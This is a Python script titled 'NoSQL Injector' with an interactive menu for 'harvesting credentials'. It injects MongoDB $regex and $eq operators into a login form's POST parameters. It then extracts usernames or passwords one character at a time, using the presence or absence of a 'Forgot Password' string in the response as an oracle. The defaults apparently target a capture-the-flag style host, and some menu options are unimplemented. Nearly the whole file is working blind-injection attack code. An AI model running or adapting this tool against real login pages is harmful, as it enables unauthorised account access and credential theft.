#!/usr/bin/python

import requests
import urllib3
import string
import urllib
import sys
import string
import copy
import os
import readline

from termcolor import colored
urllib3.disable_warnings()



header = '''
/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
\                                                                                       \\
/  _   _         _____   ____   _        _____         _              _                 /
\ | \ | |       / ____| / __ \ | |      |_   _|       (_)            | |                \\
/ |  \| |  ___ | (___  | |  | || |        | |   _ __   _   ___   ___ | |_  ___   _ __   /
\ | . ` | / _ \ \___ \ | |  | || |        | |  | '_ \ | | / _ \ / __|| __|/ _ \ | '__|  \\
/ | |\  || (_) |____) || |__| || |____   _| |_ | | | || ||  __/| (__ | |_| (_) || |     /
\ |_| \_| \___/|_____/  \___\_\|______| |_____||_| |_|| | \___| \___| \__|\___/ |_|     \\
/                                                    _/ |                               /
\                                                   |__/                                \\
/                                                                                       /
\                                                                        by minimal0    \\
/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
'''

menu = '''
MENU:

0:\tSet Attack Parameters
1:\tScan for Vuln
2:\tHarvest Credentials
q:\tExit
'''

parameter_menu = '''
Set Paramers for Attach:

0:\tSet Host/IP [%s]
1:\tSet Port [%s]
2:\tSet Path [%s]
3:\tSet http method [%s] 
4:\tSet parameter [%s]
5:\tSet parameter prefix [%s]
q:\tReturn
'''

host = 'localhost'
port = 80
path = '/'
method = 'POST'
params = ['username[$eq]=mango', 'password', 'login=login']
parameter_prefix= ''


print(colored(header,'green' ,attrs=['bold']))


def main_menu():
	menu_selection = ''
	while menu_selection != 'q':
		print(colored(menu, 'green',attrs=['bold']))
		while menu_selection == '':
			menu_selection = raw_input(colored("Enter Menu Item: ", 'blue',attrs=['bold'])).strip()
		if menu_selection[0] == 'q':
			exit()
		elif menu_selection ==  '0':
			set_attack_parameter_menu()
			menu_selection=''
		elif menu_selection ==  '2':
			harvester(0)
			menu_selection=''
		else:
			menu_selection=''


def set_attack_parameter_menu():
	global host
	global port
	global path
	global method
	global params
	menu_selection = ''
	while menu_selection != 'q':
		print(colored(parameter_menu % (host, port, path, method, params, parameter_prefix), 'yellow'))

		while menu_selection == '':	
			menu_selection = raw_input(colored("Enter Menu Item: ",'blue',attrs=['bold'])).strip()
		if menu_selection[0] == 'q':
			return
		elif menu_selection ==  '0':
			set_host = ''
			while set_host == '':
				set_host = input(colored("Enter Host: ", 'blue', attrs=['bold'])).strip()
			host = set_host
			menu_selection=''
		else:
			menu_selection=''


def harvester(attack_type):	
	global params
	print(colored('Harvesting Parameter Values now for paramter %s' % params, 'green', attrs=['bold']))
	if attack_type ==0:
		normal_harvest_mode()

def normal_harvest_mode():
	os.system('cls' if os.name == 'nt' else 'clear')
	print('\n\t')
	global host
	global port
	global path
	global method
	global params
	headers={'content-type': 'application/x-www-form-urlencoded'}
	i = 0
	count=0
	str = parameter_prefix
	end = True
	values = list()
	current_param = get_current_param(params)
	tree = list()
	tree.append(str)
	while count<len(tree):	
		leaf = tree[count]
		end = True
		while end:
			end = False
			leaf_ = ''.join(leaf)
			for x in string.printable:
				l = x
				
				if l in '|\\\t\n\r\x0b\x0c':
					continue
				if l not in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ':
					l = '\\'+l
				current = colored("\r"*(len(leaf_)+len(current_param))+current_param+" "+leaf_+x, 'green', attrs=['bold'])
				sys.stdout.write(current)
				sys.stdout.flush()
				payload = get_payload(params)
				payload = payload % (leaf_+l)	
				r = requests.post(host+":"+ unicode(port) +path, data = payload, headers = headers, verify = False)
				if "Forgot Password" not in r.text:
					if leaf_ != leaf:
						tree.append(leaf_+l)
						continue
					leaf+=l
					if leaf in values:
						end = True
						continue
					payload = get_payload(params, end='$')
					payload = payload % (leaf)	
					r = requests.post(host+":"+ unicode(port) +path, data = payload, headers = headers, verify = False)
					if "Forgot Password" not in r.text:
						values.append(leaf)
					end = True
		count+=1
		sys.stdout.write("\r"*200)
				
	print('')
	for val in values:
		print(colored("Found: "+val, "blue", attrs=['bold']))

def get_current_param(params):
	for param in params:
		if '=' not in param:
			return param

def get_payload(params, end='.*', content_type='application/x-www-form-urlencoded'):
	payload = ''
	#TODO add json option
	#TODO set only forst param not containg = which also got no values yet
	for param in range(0, len(params)):
		if "=" in params[param]:
			payload+=params[param]
		else:
			payload+=params[param]+'[$regex]=^%s'+end
		if param != len(params)-1:
			payload+='&'
	return payload


if __name__=='__main__':
	main_menu()
